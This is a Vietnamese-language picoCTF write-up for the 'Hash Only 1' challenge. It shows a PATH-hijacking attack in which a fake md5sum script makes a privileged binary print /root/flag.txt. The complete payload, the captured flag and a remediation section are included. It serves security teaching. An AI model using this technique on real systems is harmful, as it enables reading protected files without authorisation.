# picoCTF Writeup – Hash Only 1

## Thông tin bài

- **Tên bài:** Hash Only 1
- **Thể loại:** Binary Exploitation
- **Kỹ thuật:** PATH Hijacking
- **Mục tiêu:** Đọc nội dung file `/root/flag.txt`

---

## Mô tả

Sau khi SSH vào máy chủ, trong thư mục hiện tại có một file thực thi tên là:

```bash
flaghasher
```

Chạy thử chương trình:

```bash
./flaghasher
```

Kết quả:

```text
Computing the MD5 hash of /root/flag.txt....

3ee596cb43d03dbe167e9f25f37ac940  /root/flag.txt
```

Chương trình có thể đọc file `/root/flag.txt`, nhưng chỉ in ra giá trị MD5 thay vì nội dung thật của flag.

---

## Phân tích lỗ hổng

Chương trình `flaghasher` gọi lệnh tương tự:

```bash
md5sum /root/flag.txt
```

Điểm yếu là chương trình gọi `md5sum` bằng tên lệnh, thay vì dùng đường dẫn tuyệt đối:

```bash
/usr/bin/md5sum /root/flag.txt
```

Khi một chương trình gọi lệnh mà không ghi rõ đường dẫn tuyệt đối, shell sẽ tìm file thực thi dựa theo biến môi trường `PATH`.

Ví dụ:

```bash
echo $PATH
```

Kết quả có thể là:

```text
/usr/local/bin:/usr/bin:/bin
```

Shell sẽ tìm `md5sum` lần lượt tại:

```text
/usr/local/bin/md5sum
/usr/bin/md5sum
/bin/md5sum
```

File nào được tìm thấy trước sẽ được chạy.

Vì người dùng có thể thay đổi biến `PATH`, ta có thể tạo một file giả tên `md5sum`, rồi đặt thư mục chứa nó lên đầu `PATH`.

Kỹ thuật này được gọi là **PATH Hijacking**.

---

## Khai thác

### Bước 1: Tạo thư mục chứa chương trình giả

```bash
mkdir -p /tmp/fakebin
```

### Bước 2: Tạo file `md5sum` giả

```bash
printf '#!/bin/sh\n/bin/cat "$@"\n' > /tmp/fakebin/md5sum
```

Nội dung của file:

```bash
#!/bin/sh
/bin/cat "$@"
```

Trong đó:

```bash
"$@"
```

đại diện cho toàn bộ tham số được truyền vào script.

Nếu chương trình gọi:

```bash
md5sum /root/flag.txt
```

thì script giả sẽ nhận tham số:

```text
/root/flag.txt
```

và thực hiện:

```bash
/bin/cat /root/flag.txt
```

### Bước 3: Cấp quyền thực thi

```bash
chmod +x /tmp/fakebin/md5sum
```

### Bước 4: Đưa thư mục giả lên đầu `PATH`

```bash
export PATH="/tmp/fakebin:$PATH"
```

Sau đó kiểm tra:

```bash
which md5sum
```

Kết quả cần là:

```text
/tmp/fakebin/md5sum
```

Điều này chứng minh shell sẽ chạy file giả của ta thay vì `/usr/bin/md5sum`.

### Bước 5: Chạy lại chương trình

```bash
./flaghasher
```

Hoặc gộp việc thay đổi `PATH` và chạy chương trình trong một lệnh:

```bash
PATH="/tmp/fakebin:$PATH" ./flaghasher
```

Kết quả:

```text
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_7cb2e55a}
```

---

## Payload hoàn chỉnh

```bash
mkdir -p /tmp/fakebin
printf '#!/bin/sh\n/bin/cat "$@"\n' > /tmp/fakebin/md5sum
chmod +x /tmp/fakebin/md5sum
PATH="/tmp/fakebin:$PATH" ./flaghasher
```

---

## Luồng thực thi

```text
Người dùng chạy ./flaghasher
              |
              v
flaghasher gọi md5sum /root/flag.txt
              |
              v
Shell tìm md5sum theo biến PATH
              |
              v
/tmp/fakebin nằm trước /usr/bin
              |
              v
Shell chạy /tmp/fakebin/md5sum
              |
              v
Script giả chạy /bin/cat /root/flag.txt
              |
              v
Flag được in ra màn hình
```

---

## Nguyên nhân chương trình bị khai thác

Chương trình có quyền đọc file `/root/flag.txt`, nhưng lại gọi một chương trình ngoài thông qua tên lệnh phụ thuộc vào `PATH`.

Lệnh không an toàn:

```bash
md5sum /root/flag.txt
```

Lệnh an toàn hơn:

```bash
/usr/bin/md5sum /root/flag.txt
```

Khi dùng đường dẫn tuyệt đối, shell không cần tìm `md5sum` trong `PATH`, nên file giả của người dùng sẽ không được chạy.

Ngoài ra, chương trình có đặc quyền không nên tin tưởng hoàn toàn vào các biến môi trường do người dùng kiểm soát.

---

## Kết luận

Bài này không cần khai thác buffer overflow hay ghi đè bộ nhớ.

Lỗ hổng chính là:

```text
Chương trình đặc quyền gọi lệnh ngoài bằng tên tương đối
+
Người dùng kiểm soát biến PATH
=
PATH Hijacking
```

Flag:

```text
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_7cb2e55a}
```
